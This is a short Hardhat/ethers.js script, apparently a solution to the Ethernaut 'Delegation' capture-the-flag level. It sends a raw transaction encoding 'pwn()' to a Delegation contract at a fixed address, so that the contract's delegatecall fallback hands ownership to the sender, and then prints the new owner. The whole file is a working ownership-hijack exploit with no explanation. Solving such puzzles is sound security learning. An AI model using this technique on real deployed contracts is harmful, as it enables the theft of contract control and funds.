
import { ethers } from "hardhat";

async function main() {
    const [account] = await ethers.getSigners();

    const Delegation = await ethers.getContractFactory("Delegation");
    const delegation = Delegation.attach("0x1Ec931f41a49546b06da7bFF9b8E4ba1d48160ec");


    const iface = new ethers.utils.Interface([
        "constructor(address _owner) public",
        "function pwn() public"
    ]);

    let data = iface.encodeFunctionData("pwn()", []);
    data += "0000000000000000000000000000000000000000000000000000000000000000";

    let tx = await account.sendTransaction({
        from: account.address,
        to: delegation.address,
        data: data,
        gasLimit: 1000000
    });
    await tx.wait();

    console.log(account.address);
    console.log(await delegation.owner());
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });


